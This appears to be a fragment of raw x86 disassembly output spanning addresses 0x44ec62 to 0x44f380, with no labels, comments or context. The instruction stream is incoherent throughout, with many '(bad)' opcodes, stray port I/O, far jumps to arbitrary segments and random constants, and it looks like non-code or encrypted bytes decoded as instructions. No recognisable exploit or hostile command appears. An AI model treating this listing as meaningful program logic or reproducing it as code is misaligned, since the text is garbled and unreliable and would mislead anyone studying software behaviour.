  44ec62:	clc    
  44ec63:	pop    ebx
  44ec64:	je     0x44ecb7
  44ec66:	mov    ch,BYTE PTR [edx+0x547f8a74]
  44ec6c:	mov    BYTE PTR [esi],ch
  44ec6e:	mov    dl,0x6e
  44ec70:	mov    cl,BYTE PTR [esi-0x2876c380]
  44ec76:	add    eax,DWORD PTR [edi*8-0x1bc95b7d]
  44ec7d:	add    bl,BYTE PTR [edx+0x588c1550]
  44ec83:	hlt    
  44ec84:	dec    edx
  44ec85:	imul   eax,DWORD PTR [edi-0x65],0xd49ee396
  44ec8c:	popa   
  44ec8d:	sub    BYTE PTR [ebp+0x2d],al
  44ec90:	or     esp,DWORD PTR [ecx]
  44ec92:	push   esp
  44ec93:	test   BYTE PTR [eax+0x6ba45a14],bh
  44ec99:	xchg   edx,eax
  44ec9a:	shl    DWORD PTR [ebx],1
  44ec9c:	mov    DWORD PTR [edx-0xe7f1725],esi
  44eca2:	outs   dx,BYTE PTR ds:[esi]
  44eca3:	lahf   
  44eca4:	loop   0x44ecdc
  44eca6:	rol    DWORD PTR [ebp+0x9],cl
  44eca9:	ret    
  44ecaa:	or     bh,BYTE PTR [edi]
  44ecac:	pop    edi
  44ecad:	inc    esp
  44ecae:	xor    BYTE PTR [ebx+0x1d],ah
  44ecb1:	add    BYTE PTR [esi],al
  44ecb3:	out    dx,eax
  44ecb4:	ss xchg ch,ch
  44ecb7:	in     al,0x9d
  44ecb9:	pop    eax
  44ecba:	es mov ch,0x8e
  44ecbd:	and    eax,0xe7002d23
  44ecc2:	pop    es
  44ecc3:	in     al,0x30
  44ecc5:	sub    BYTE PTR [edi],dh
  44ecc7:	shl    DWORD PTR [eax-0x1f],1
  44ecca:	mov    WORD PTR [edx],es
  44eccc:	cmp    BYTE PTR [esi],al
  44ecce:	adc    eax,0x654a12cc
  44ecd3:	or     eax,0x6ccf4205
  44ecd8:	popa   
  44ecd9:	mov    esp,0x53bed4d8
  44ecde:	adc    ebp,0xe1635f79
  44ece4:	dec    ebx
  44ece5:	pop    es
  44ece6:	pushf  
  44ece7:	adc    cl,BYTE PTR [eax+0x58e56dd3]
  44eced:	(bad)  
  44ecee:	out    dx,eax
  44ecef:	add    eax,0x575a05b7
  44ecf4:	xor    ch,BYTE PTR [ecx+eiz*2]
  44ecf7:	mov    WORD PTR [esi+eax*8],?
  44ecfa:	(bad)  
  44ecfb:	mov    DWORD PTR cs:[ebx],ebx
  44ecfe:	push   esp
  44ecff:	push   edx
  44ed00:	cmp    al,0xa7
  44ed02:	adc    al,0x17
  44ed04:	pushf  
  44ed05:	loope  0x44ecd8
  44ed07:	aam    0x11
  44ed09:	sti    
  44ed0a:	and    eax,0xaaf8bcff
  44ed0f:	jo     0x44ec99
  44ed11:	fld    TBYTE PTR [eax]
  44ed13:	nop
  44ed14:	es inc ecx
  44ed16:	jo     0x44ecf0
  44ed18:	jnp    0x44ed1d
  44ed1a:	push   0x78
  44ed1c:	fdivr  st,st(2)
  44ed1e:	cmc    
  44ed1f:	icebp  
  44ed20:	cwde   
  44ed21:	adc    eax,0x6e85a0f
  44ed26:	pusha  
  44ed27:	rol    DWORD PTR [ebx],0x63
  44ed2a:	xor    edx,DWORD PTR [edx+ebx*4+0x62d42660]
  44ed31:	lahf   
  44ed32:	add    eax,0x832d9180
  44ed37:	(bad)  [ecx+0x3dd76b99]
  44ed3d:	ret    0xa265
  44ed40:	ds xor eax,0xf1eb47f6
  44ed46:	pusha  
  44ed47:	mov    ch,0x40
  44ed49:	scas   al,BYTE PTR es:[edi]
  44ed4a:	adc    DWORD PTR [ebp+0x44c6035e],edi
  44ed50:	fadd   DWORD PTR [ebp+0x6c]
  44ed53:	add    esi,DWORD PTR [ebp+0x23a960a1]
  44ed59:	test   BYTE PTR [ebx-0x46262388],ah
  44ed5f:	aad    0x6a
  44ed61:	repz inc eax
  44ed63:	out    0x6d,al
  44ed65:	js     0x44edd2
  44ed67:	sub    esp,DWORD PTR [esi+eiz*1+0x1f]
  44ed6b:	inc    ebp
  44ed6c:	call   0x8eae4619
  44ed71:	jl     0x44ed05
  44ed73:	stos   BYTE PTR es:[edi],al
  44ed74:	lahf   
  44ed75:	sub    eax,ecx
  44ed77:	xor    BYTE PTR [esi],ah
  44ed79:	add    ebx,DWORD PTR [esi+0x3]
  44ed7c:	add    BYTE PTR [edx+0x6d],ch
  44ed7f:	cmp    DWORD PTR [edx],0xffffff86
  44ed82:	jns    0x44ed6b
  44ed84:	lods   al,BYTE PTR ds:[esi]
  44ed85:	out    dx,al
  44ed86:	pop    ebx
  44ed87:	push   esp
  44ed88:	mov    ah,BYTE PTR [ecx+edx*1+0x44]
  44ed8c:	jo     0x44ed8c
  44ed8e:	sbb    al,0xd6
  44ed90:	std    
  44ed91:	fsubrp st(3),st
  44ed93:	jae    0x44ed58
  44ed95:	test   DWORD PTR [ecx-0xc],0xa4123a8b
  44ed9c:	mov    BYTE PTR [edi-0x7a4bb14f],cl
  44eda2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44eda3:	mov    bl,0x65
  44eda5:	add    ch,BYTE PTR [edx+ecx*4-0x8]
  44eda9:	pop    ebp
  44edaa:	xchg   esp,eax
  44edab:	enter  0x8ea8,0x60
  44edaf:	cmp    eax,ecx
  44edb1:	scas   al,BYTE PTR es:[edi]
  44edb2:	and    bh,BYTE PTR [edi-0x2bde2662]
  44edb8:	add    cl,BYTE PTR [edx+0x16]
  44edbb:	jns    0x44edac
  44edbd:	aas    
  44edbe:	or     al,0x23
  44edc0:	call   0xbd02:0x3eb62255
  44edc7:	test   eax,0xd5e4b728
  44edcc:	cs cwde 
  44edce:	out    0x61,eax
  44edd0:	inc    ebp
  44edd1:	das    
  44edd2:	in     eax,0x2b
  44edd4:	(bad)  
  44edd5:	repz in eax,dx
  44edd7:	mov    ?,WORD PTR [esp+ecx*2+0x25599cd1]
  44edde:	cmc    
  44eddf:	stos   BYTE PTR es:[edi],al
  44ede0:	mov    edx,0x22b59cdf
  44ede5:	pop    edi
  44ede6:	iret   
  44ede7:	push   esi
  44ede8:	pop    DWORD PTR ds:0x36a3fff5
  44edee:	sti    
  44edef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44edf0:	xor    DWORD PTR ds:0x1b41bcff,ebx
  44edf6:	push   eax
  44edf7:	jo     0x44ee2d
  44edf9:	mov    ebx,0xeeb4555c
  44edfe:	sbb    eax,0x8bb888f
  44ee03:	push   edi
  44ee04:	shl    BYTE PTR [esi-0xf],1
  44ee07:	xchg   BYTE PTR [edi],dh
  44ee09:	sub    al,0x92
  44ee0b:	mov    eax,ds:0x760a74a
  44ee10:	add    al,0xda
  44ee12:	into   
  44ee13:	sub    eax,0xfa87b9b0
  44ee18:	or     eax,ebx
  44ee1a:	outs   dx,BYTE PTR ds:[esi]
  44ee1b:	dec    edi
  44ee1c:	mov    edi,0xf5f24e5f
  44ee21:	add    al,BYTE PTR [edx+0x38aa9af9]
  44ee27:	add    BYTE PTR [esi],ch
  44ee29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ee2a:	pop    ds
  44ee2b:	jno    0x44eeac
  44ee2d:	mov    cl,0xdf
  44ee2f:	jge    0x44edff
  44ee31:	jmp    0x587c:0xb08fd552
  44ee38:	push   0x88a28f3a
  44ee3d:	imul   edx,DWORD PTR [ecx],0xffefa198
  44ee43:	pusha  
  44ee44:	enter  0x9b8e,0x5c
  44ee48:	mov    BYTE PTR [eax],dh
  44ee4a:	xchg   dl,dh
  44ee4c:	and    al,0x16
  44ee4e:	mov    ds:0x60a07983,al
  44ee53:	mov    ebx,0xac12ba71
  44ee58:	into   
  44ee59:	ins    BYTE PTR es:[edi],dx
  44ee5a:	sbb    esi,DWORD PTR [ebp-0x476324dc]
  44ee60:	dec    ecx
  44ee61:	cmp    edi,ecx
  44ee63:	push   ebx
  44ee64:	push   edi
  44ee65:	nop    DWORD PTR [edi]
  44ee68:	shr    BYTE PTR [edi],cl
  44ee6a:	lea    ebp,[edi-0x2ba807c2]
  44ee70:	(bad)  
  44ee71:	scas   al,BYTE PTR es:[edi]
  44ee72:	in     al,0x88
  44ee74:	inc    edx
  44ee75:	in     al,dx
  44ee76:	out    dx,eax
  44ee77:	in     al,dx
  44ee78:	jns    0x44eee6
  44ee7a:	pop    ds
  44ee7b:	xchg   DWORD PTR [ecx],esi
  44ee7d:	push   edx
  44ee7e:	push   esp
  44ee7f:	pop    eax
  44ee80:	bound  esi,QWORD PTR [ebx+0x2ecbd414]
  44ee86:	popa   
  44ee87:	clc    
  44ee88:	add    al,0x95
  44ee8a:	test   al,0xb1
  44ee8c:	repnz cmp DWORD PTR [esi],0x9741ccd4
  44ee93:	js     0x44ee93
  44ee95:	jg     0x44ef05
  44ee97:	mov    ecx,0x12efc71b
  44ee9c:	or     al,BYTE PTR [esi]
  44ee9e:	lods   eax,DWORD PTR ds:[esi]
  44ee9f:	outs   dx,DWORD PTR ds:[esi]
  44eea0:	jo     0x44ee8d
  44eea2:	je     0x44ef17
  44eea4:	clc    
  44eea5:	fsub   DWORD PTR [eax-0x7f]
  44eea8:	xlat   BYTE PTR ds:[ebx]
  44eea9:	mov    ecx,0x11ffc70f
  44eeae:	ja     0x44eef0
  44eeb0:	inc    ebx
  44eeb1:	js     0x44eed1
  44eeb3:	sar    ch,0xf3
  44eeb6:	add    edx,DWORD PTR [edx-0x46e07f92]
  44eebc:	je     0x44ee50
  44eebe:	fisttp WORD PTR [edx]
  44eec0:	int3   
  44eec1:	mov    DWORD PTR [edx-0x2c],esi
  44eec4:	sahf   
  44eec5:	or     eax,0x1df67af6
  44eeca:	stc    
  44eecb:	test   DWORD PTR [ebx+0x5959bbbf],0x8d4bf93
  44eed5:	ja     0x44eea0
  44eed7:	aad    0xcf
  44eed9:	xor    dl,bl
  44eedb:	imul   BYTE PTR [edi-0x77c8f152]
  44eee1:	jno    0x44ef07
  44eee3:	adc    al,0x52
  44eee5:	iret   
  44eee6:	into   
  44eee7:	mov    esi,DWORD PTR [edi+0x3]
  44eeea:	je     0x44ee73
  44eeec:	aam    0xf8
  44eeee:	xchg   esi,eax
  44eeef:	xchg   edi,eax
  44eef0:	loop   0x44ee95
  44eef2:	pusha  
  44eef3:	xor    ah,BYTE PTR gs:[eax]
  44eef6:	push   0x7c
  44eef8:	es nop
  44eefa:	retf   0x69d5
  44eefd:	jne    0x44ee9c
  44eeff:	jmp    0x44ef12
  44ef01:	ror    dl,cl
  44ef03:	cmp    BYTE PTR [eax+0x1f9a8f89],cl
  44ef09:	imul   ebp,DWORD PTR [eax],0xb4026ba9
  44ef0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ef10:	inc    eax
  44ef11:	add    eax,0x79c2ba27
  44ef16:	dec    esi
  44ef17:	inc    ebx
  44ef18:	retf   0x3bb2
  44ef1b:	(bad)  
  44ef1c:	mov    ds:0x8f28d805,al
  44ef21:	cmp    DWORD PTR [ebx+0x46],ebp
  44ef24:	mov    ebp,0xf47773f6
  44ef29:	add    ebp,edi
  44ef2b:	fmul   QWORD PTR [ecx-0x7d609011]
  44ef31:	retf   
  44ef32:	in     eax,0xd4
  44ef34:	sub    eax,0x88f2843c
  44ef39:	push   ss
  44ef3a:	jae    0x44eee8
  44ef3c:	mov    bl,cl
  44ef3e:	fdiv   st(6),st
  44ef40:	sub    al,0xff
  44ef42:	pop    ebp
  44ef43:	jne    0x44eeef
  44ef45:	add    eax,0x32745360
  44ef4a:	push   ss
  44ef4b:	fsub   DWORD PTR [ebx+0x30df7a39]
  44ef51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ef52:	push   esi
  44ef53:	xchg   esp,eax
  44ef54:	outs   dx,BYTE PTR ds:[esi]
  44ef55:	stos   BYTE PTR es:[edi],al
  44ef56:	jecxz  0x44ef48
  44ef58:	stos   BYTE PTR es:[edi],al
  44ef59:	add    eax,0x9fe92280
  44ef5e:	jmp    0x44efcd
  44ef60:	mov    edi,0x3ee91fcb
  44ef65:	xor    al,0x50
  44ef67:	lods   eax,DWORD PTR ds:[esi]
  44ef68:	inc    eax
  44ef69:	jno    0x44efcd
  44ef6b:	aad    0xb0
  44ef6d:	mov    cl,0x5a
  44ef6f:	jle    0x44ef42
  44ef71:	je     0x44ef2c
  44ef73:	in     eax,dx
  44ef74:	mov    DWORD PTR [edi+0xf28fa7c],edx
  44ef7a:	cmp    al,0xb1
  44ef7c:	dec    esi
  44ef7d:	add    esi,DWORD PTR [eax-0x4b]
  44ef80:	repnz sbb BYTE PTR [edx-0x62],ah
  44ef84:	jg     0x44ef38
  44ef86:	pop    ds
  44ef87:	push   ebp
  44ef88:	jbe    0x44ef46
  44ef8a:	fwait
  44ef8b:	cs (bad) 
  44ef8d:	loopne 0x44ef9e
  44ef8f:	xlat   BYTE PTR ds:[ebx]
  44ef90:	daa    
  44ef91:	adc    al,0xa0
  44ef93:	jnp    0x44ef24
  44ef95:	dec    ebp
  44ef96:	rol    BYTE PTR [esi-0x78],0x29
  44ef9a:	push   ebx
  44ef9b:	sahf   
  44ef9c:	lods   al,BYTE PTR ds:[esi]
  44ef9d:	cld    
  44ef9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ef9f:	push   eax
  44efa0:	jle    0x44efa4
  44efa2:	or     BYTE PTR [ebx],dh
  44efa4:	adc    ecx,ebp
  44efa6:	loopne 0x44efc2
  44efa8:	stos   DWORD PTR es:[edi],eax
  44efa9:	jne    0x44f026
  44efab:	jns    0x44ef95
  44efad:	in     eax,0x1
  44efaf:	xchg   edi,eax
  44efb0:	sub    esp,DWORD PTR [edi+0x3adc9d3]
  44efb6:	call   0x5a91:0x34ea8db5
  44efbd:	call   0x9869:0x27f3825e
  44efc4:	into   
  44efc5:	test   eax,esp
  44efc7:	dec    ebx
  44efc8:	icebp  
  44efc9:	xor    BYTE PTR [esi],cl
  44efcb:	push   es
  44efcc:	ds sbb al,0x50
  44efcf:	or     al,0x3f
  44efd1:	sub    DWORD PTR [edi-0x66],ecx
  44efd4:	dec    ecx
  44efd5:	dec    ebx
  44efd6:	mov    al,ds:0x198588d3
  44efdb:	stos   BYTE PTR es:[edi],al
  44efdc:	ins    BYTE PTR es:[edi],dx
  44efdd:	imul   ebx,ebx,0x52028971
  44efe3:	inc    edi
  44efe4:	loope  0x44ef9c
  44efe6:	pop    edi
  44efe7:	rcl    BYTE PTR [ebp+0x73],0x1f
  44efeb:	sbb    esp,DWORD PTR [edx]
  44efed:	loopne 0x44f002
  44efef:	popf   
  44eff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44eff1:	stc    
  44eff2:	xchg   ebp,eax
  44eff3:	stos   DWORD PTR es:[edi],eax
  44eff4:	jecxz  0x44f03d
  44eff6:	sar    cl,cl
  44eff8:	sbb    DWORD PTR [edx],eax
  44effa:	dec    ecx
  44effb:	cmp    eax,DWORD PTR [ebx+0x2df360ce]
  44f001:	cmp    BYTE PTR ds:0x134dc610,ah
  44f007:	aam    0x7c
  44f009:	stc    
  44f00a:	inc    edi
  44f00b:	in     al,dx
  44f00c:	test   al,0x31
  44f00e:	pop    ss
  44f00f:	push   edx
  44f010:	sahf   
  44f011:	repz cmp al,0xa3
  44f014:	bound  esp,QWORD PTR ds:0xd0b8151e
  44f01a:	lock xchg esp,eax
  44f01c:	lea    eax,ds:0xf5d09d78
  44f022:	pop    ecx
  44f023:	stos   BYTE PTR es:[edi],al
  44f024:	outs   dx,BYTE PTR ds:[esi]
  44f025:	dec    eax
  44f026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f027:	lods   eax,DWORD PTR ds:[esi]
  44f028:	cs in  al,dx
  44f02a:	outs   dx,BYTE PTR ds:[esi]
  44f02b:	dec    ebx
  44f02c:	(bad)  
  44f02d:	(bad)  
  44f02e:	pop    edi
  44f02f:	out    0x3b,al
  44f031:	mov    ds:0xf9e147af,eax
  44f036:	fs addr16 pusha 
  44f039:	cdq    
  44f03a:	sbb    BYTE PTR [edi+0x38],al
  44f03d:	leave  
  44f03e:	bound  ebp,QWORD PTR ds:0x5cbcf8a
  44f044:	ror    DWORD PTR [ecx+0xe],1
  44f047:	outs   dx,DWORD PTR ds:[esi]
  44f048:	enter  0xc402,0x4f
  44f04c:	xchg   edx,eax
  44f04d:	and    eax,0x8f54cfad
  44f052:	popa   
  44f053:	imul   edx,DWORD PTR [ebx-0x79],0xffffffe9
  44f057:	dec    esp
  44f058:	jo     0x44f072
  44f05a:	cmp    eax,0x78775fe7
  44f05f:	test   DWORD PTR [ebp+0x2],ebx
  44f062:	pop    esp
  44f063:	sub    cl,ch
  44f065:	out    0xa9,eax
  44f067:	pop    ds
  44f068:	iret   
  44f069:	dec    edx
  44f06a:	pusha  
  44f06b:	jmp    0x44f0df
  44f06d:	sub    DWORD PTR ds:0x3f64749d,edi
  44f073:	cli    
  44f074:	push   edx
  44f075:	add    ebp,DWORD PTR [esi-0x38db2e15]
  44f07b:	cmp    DWORD PTR [edx-0x6ef49ffc],ebx
  44f081:	jp     0x44f070
  44f083:	dec    ecx
  44f084:	stos   BYTE PTR es:[edi],al
  44f085:	loop   0x44f0eb
  44f087:	(bad)  
  44f088:	sub    ah,ch
  44f08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f08b:	rep lods al,BYTE PTR ds:[esi]
  44f08d:	pop    eax
  44f08e:	data16 cld 
  44f090:	sbb    edi,DWORD PTR [edi]
  44f092:	push   ds
  44f093:	cmc    
  44f094:	cmp    eax,0x9c314288
  44f099:	das    
  44f09a:	das    
  44f09b:	xlat   BYTE PTR ds:[ebx]
  44f09c:	cdq    
  44f09d:	mov    ebx,0xcc5092d1
  44f0a2:	sub    edi,edi
  44f0a4:	mov    DWORD PTR [ecx],esi
  44f0a6:	dec    eax
  44f0a7:	shl    al,cl
  44f0a9:	ds pushf 
  44f0ab:	mov    bl,0xb2
  44f0ad:	pop    ss
  44f0ae:	in     al,dx
  44f0af:	add    eax,0xd5487e35
  44f0b4:	pushf  
  44f0b5:	push   es
  44f0b6:	ins    DWORD PTR es:[edi],dx
  44f0b7:	dec    ecx
  44f0b8:	mov    DWORD PTR [ecx],edi
  44f0ba:	add    BYTE PTR [esi-0xd],ah
  44f0bd:	(bad)  
  44f0be:	mov    dh,BYTE PTR [esi-0x6e]
  44f0c1:	loop   0x44f09c
  44f0c3:	aad    0x77
  44f0c5:	inc    esi
  44f0c6:	and    eax,0x69a7e3bf
  44f0cb:	pop    ebx
  44f0cc:	mov    DWORD PTR [edi+0x7d],esp
  44f0cf:	scas   eax,DWORD PTR es:[edi]
  44f0d0:	es adc al,0x87
  44f0d3:	shl    dl,1
  44f0d5:	or     al,0x79
  44f0d7:	stos   BYTE PTR es:[edi],al
  44f0d8:	and    eax,0x5850d46b
  44f0dd:	add    bh,BYTE PTR [ecx]
  44f0df:	repnz sbb DWORD PTR [esi+ebx*1],0xdaf5a357
  44f0e7:	sbb    ebp,DWORD PTR [edx]
  44f0e9:	xor    dl,BYTE PTR [ebx]
  44f0eb:	xlat   BYTE PTR ds:[ebx]
  44f0ec:	es ins DWORD PTR es:[edi],dx
  44f0ee:	fcomp  DWORD PTR fs:[edx]
  44f0f1:	mov    esp,0x5988910b
  44f0f6:	xor    DWORD PTR [edi-0x4e],esi
  44f0f9:	addr16 jno 0x44f135
  44f0fc:	in     al,0xc5
  44f0fe:	retf   0x3398
  44f101:	stc    
  44f102:	outs   dx,BYTE PTR ds:[esi]
  44f103:	push   esp
  44f104:	cmp    eax,0x5e12dd2a
  44f109:	mov    eax,ds:0x98460560
  44f10e:	inc    ecx
  44f10f:	dec    edx
  44f110:	or     eax,0x6805794b
  44f115:	lock sbb eax,0xe08d17d4
  44f11b:	lea    ebx,[eax]
  44f11d:	lods   eax,DWORD PTR ds:[esi]
  44f11e:	and    esi,DWORD PTR [ebp+0x79488d88]
  44f124:	push   esp
  44f125:	ins    BYTE PTR es:[edi],dx
  44f126:	jae    0x44f0c1
  44f128:	xor    DWORD PTR [edx],eax
  44f12a:	es sbb ebp,eax
  44f12d:	repz mov al,0x8f
  44f130:	or     BYTE PTR [ebx-0x115fb0a0],ch
  44f136:	sub    DWORD PTR [eax],edi
  44f138:	pop    es
  44f139:	add    eax,DWORD PTR [edi-0x21]
  44f13c:	test   BYTE PTR [ecx+0x4],cl
  44f13f:	in     al,0x37
  44f141:	add    BYTE PTR [edx-0x179a79d8],al
  44f147:	lds    esp,FWORD PTR [ebp+edi*8-0x67d5c8e1]
  44f14e:	dec    esi
  44f14f:	call   0xd4ecfcf4
  44f154:	lods   al,BYTE PTR ds:[esi]
  44f155:	xchg   esi,eax
  44f156:	imul   esi,esi,0xffffffd8
  44f159:	jae    0x44f0fc
  44f15b:	jp     0x44f10b
  44f15d:	aas    
  44f15e:	loopne 0x44f1b5
  44f160:	mov    DWORD PTR [ebp+0x40e78b0],eax
  44f166:	or     DWORD PTR [edx-0x4b836caa],edi
  44f16c:	(bad)  
  44f16d:	mov    ecx,0x912bd359
  44f172:	pop    edi
  44f173:	cli    
  44f174:	xchg   esp,eax
  44f175:	outs   dx,DWORD PTR ds:[esi]
  44f176:	push   ds
  44f177:	push   DWORD PTR [ecx+eax*2+0x5ae48c03]
  44f17e:	out    dx,eax
  44f17f:	aam    0x22
  44f181:	in     eax,dx
  44f182:	rol    BYTE PTR [edi+0x35],0xe7
  44f186:	imul   esp,esp,0xffffff88
  44f189:	xchg   ebp,eax
  44f18a:	aas    
  44f18b:	push   edx
  44f18c:	inc    esp
  44f18d:	ss jae 0x44f15e
  44f190:	lods   eax,DWORD PTR ds:[esi]
  44f191:	in     eax,dx
  44f192:	jo     0x44f1d5
  44f194:	or     DWORD PTR [edi+ebx*1-0x4a],esi
  44f198:	ret    
  44f199:	les    ebp,FWORD PTR [eax]
  44f19b:	mov    ch,0xb8
  44f19d:	or     DWORD PTR [ebx+0x29],ecx
  44f1a0:	or     BYTE PTR [edi+ebx*1+0x5f],0x8f
  44f1a5:	push   ss
  44f1a6:	jne    0x44f167
  44f1a8:	out    dx,al
  44f1a9:	icebp  
  44f1aa:	std    
  44f1ab:	aam    0x72
  44f1ad:	stos   DWORD PTR es:[edi],eax
  44f1ae:	xchg   edi,eax
  44f1af:	add    BYTE PTR es:[ecx],cl
  44f1b2:	in     eax,0x5e
  44f1b4:	fwait
  44f1b5:	xchg   DWORD PTR [ecx+0x62],esi
  44f1b8:	mov    al,ds:0x95d711c6
  44f1bd:	leave  
  44f1be:	(bad)  
  44f1bf:	dec    ebx
  44f1c0:	dec    edi
  44f1c1:	test   BYTE PTR [eax+0x61],ah
  44f1c4:	pop    ebx
  44f1c5:	or     BYTE PTR [ebx],bh
  44f1c7:	xor    DWORD PTR [ebx+0x31],esi
  44f1ca:	scas   al,BYTE PTR es:[edi]
  44f1cb:	jl     0x44f175
  44f1cd:	pop    DWORD PTR [ecx]
  44f1cf:	aam    0x46
  44f1d1:	dec    ecx
  44f1d2:	add    bl,BYTE PTR [ebp+0x12]
  44f1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f1d6:	pop    ds
  44f1d7:	push   edi
  44f1d8:	int    0x1d
  44f1da:	imul   ebp,edi,0x3c
  44f1dd:	stc    
  44f1de:	pop    esi
  44f1df:	aam    0x74
  44f1e1:	aas    
  44f1e2:	aaa    
  44f1e3:	sar    DWORD PTR [esi+0x6b],cl
  44f1e6:	and    ebx,DWORD PTR [esi]
  44f1e8:	mov    edi,ebx
  44f1ea:	sar    DWORD PTR [ecx-0x418248f2],1
  44f1f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f1f1:	add    al,BYTE PTR [eax+ebx*2+0x44ba615c]
  44f1f8:	fs cmc 
  44f1fa:	pusha  
  44f1fb:	jge    0x44f22e
  44f1fd:	jno    0x44f1b0
  44f1ff:	stos   BYTE PTR es:[edi],al
  44f200:	jbe    0x44f1bf
  44f202:	shr    BYTE PTR [edx+0x31b06c83],1
  44f208:	xchg   BYTE PTR [ebx-0x22],ah
  44f20b:	retf   0xda3
  44f20e:	pushf  
  44f20f:	jmp    0xb0c6c39c
  44f214:	mov    al,ds:0x74443c67
  44f219:	daa    
  44f21a:	and    ch,BYTE PTR [edx-0x18]
  44f21d:	mov    ds:0xa4670420,al
  44f222:	rcl    cl,1
  44f224:	mov    DWORD PTR [ecx],esp
  44f226:	xchg   ecx,eax
  44f227:	push   ss
  44f228:	shl    BYTE PTR [edx],1
  44f22a:	stos   DWORD PTR es:[edi],eax
  44f22b:	pop    es
  44f22c:	push   esi
  44f22d:	adc    al,0x96
  44f22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f230:	xlat   BYTE PTR ds:[ebx]
  44f231:	pop    edx
  44f232:	and    dh,ah
  44f234:	inc    edi
  44f235:	add    eax,0xbf8f5b3e
  44f23a:	pop    ecx
  44f23b:	int    0x13
  44f23d:	hlt    
  44f23e:	inc    ebp
  44f23f:	xchg   esp,eax
  44f240:	cs jns 0x44f291
  44f243:	int    0x5e
  44f245:	add    ebp,DWORD PTR [eax]
  44f247:	push   0xe
  44f249:	shl    BYTE PTR [eax+eax*2],cl
  44f24c:	inc    esp
  44f24d:	mov    edx,0x998e9134
  44f252:	sbb    ah,al
  44f254:	xlat   BYTE PTR ds:[ebx]
  44f255:	dec    edx
  44f256:	dec    edi
  44f257:	test   DWORD PTR [edi],edx
  44f259:	nop
  44f25a:	arpl   WORD PTR ds:0xc41ed9e7,di
  44f260:	rol    DWORD PTR ds:0xef0fd1ba,0xd4
  44f267:	lahf   
  44f268:	push   edi
  44f269:	jbe    0x44f28a
  44f26b:	pop    ebx
  44f26c:	push   ebx
  44f26d:	gs shl al,cl
  44f270:	popa   
  44f271:	lahf   
  44f272:	xor    ah,bl
  44f274:	retf   0xb108
  44f277:	aam    0x90
  44f279:	repz add DWORD PTR [ebx],ecx
  44f27c:	mov    esp,0xd6040c3d
  44f281:	icebp  
  44f282:	mov    ah,0x18
  44f284:	add    ebx,DWORD PTR gs:[ebp-0x20861743]
  44f28b:	sub    eax,0xf40aa788
  44f290:	adc    eax,0x1cfde4f6
  44f295:	add    edx,DWORD PTR [edx+0xe]
  44f298:	push   0x44
  44f29a:	(bad)  
  44f29b:	out    dx,eax
  44f29c:	or     ebp,esp
  44f29e:	xchg   ecx,eax
  44f29f:	sbb    DWORD PTR ds:0x81d86a02,eax
  44f2a5:	dec    ebp
  44f2a6:	repz sahf 
  44f2a8:	cmp    al,BYTE PTR [edx]
  44f2aa:	or     al,0xaa
  44f2ac:	das    
  44f2ad:	es jecxz 0x44f26a
  44f2b0:	aas    
  44f2b1:	test   eax,0xa8e78160
  44f2b6:	fwait
  44f2b7:	and    eax,0xba039c56
  44f2bc:	cli    
  44f2bd:	ds call 0x211c8a49
  44f2c3:	and    bh,ch
  44f2c5:	nop
  44f2c6:	push   edx
  44f2c7:	mov    al,0x88
  44f2c9:	mov    ds:0xc00efaaa,eax
  44f2ce:	loop   0x44f2de
  44f2d0:	loopne 0x44f2d8
  44f2d2:	scas   eax,DWORD PTR es:[edi]
  44f2d3:	aam    0xaa
  44f2d5:	xor    edi,DWORD PTR [esi-0xe]
  44f2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f2d9:	sub    eax,0x89890184
  44f2de:	bnd js 0x44f275
  44f2e1:	push   0x67
  44f2e3:	and    al,0xa2
  44f2e5:	or     eax,0xd78d4e8
  44f2ea:	das    
  44f2eb:	ds sar eax,0x66
  44f2ef:	inc    eax
  44f2f0:	mov    ebx,esp
  44f2f2:	inc    edi
  44f2f3:	mov    ebx,0x69faf52b
  44f2f8:	add    ah,BYTE PTR gs:[eax+0xa]
  44f2fc:	test   al,0x14
  44f2fe:	call   0x89f0:0x3fc71c28
  44f305:	adc    DWORD PTR [esi],ebp
  44f307:	mov    dl,0x78
  44f309:	mov    eax,0xe8def1
  44f30e:	push   ss
  44f30f:	xchg   ecx,eax
  44f310:	dec    eax
  44f311:	je     0x44f2a2
  44f313:	xchg   ecx,eax
  44f314:	dec    esp
  44f315:	jmp    0x2566:0x9a7a6012
  44f31c:	mov    dh,BYTE PTR [edx]
  44f31e:	sub    eax,0xdb435059
  44f323:	xor    DWORD PTR [eax+0x2],0xffffff9e
  44f327:	daa    
  44f328:	mov    ds:0xb2df9267,eax
  44f32d:	dec    ecx
  44f32e:	pop    ds
  44f32f:	and    DWORD PTR [ecx],esi
  44f331:	iret   
  44f332:	ficom  DWORD PTR [ecx+0x56]
  44f335:	shr    BYTE PTR [edx+0x597892d3],0x80
  44f33c:	push   edx
  44f33d:	hlt    
  44f33e:	and    BYTE PTR [esi-0x23],0x3
  44f342:	es stos DWORD PTR es:[edi],eax
  44f344:	mov    BYTE PTR [edi-0x9],dl
  44f347:	xor    al,0xb9
  44f349:	xchg   DWORD PTR [ecx-0x15fc83a3],esi
  44f34f:	lds    ebp,FWORD PTR [ecx]
  44f351:	(bad)  
  44f353:	cmp    ah,BYTE PTR [ebp-0x7749bf58]
  44f359:	aaa    
  44f35a:	retf   
  44f35b:	cld    
  44f35c:	sub    eax,0x2de66359
  44f361:	ds add al,0x9
  44f364:	xor    eax,0x54960202
  44f369:	cld    
  44f36a:	(bad)  
  44f36c:	mov    DWORD PTR [edi-0x3],ebp
  44f36f:	push   ebp
  44f370:	xchg   esp,eax
  44f371:	add    edx,DWORD PTR [edx]
  44f373:	add    al,0x48
  44f375:	add    cl,BYTE PTR [edx-0x14]
  44f378:	cmp    al,0x3e
  44f37a:	mov    ?,WORD PTR [esi+0x311e7f48]
  44f380:	fimul  DWORD PTR [eax-0x59]
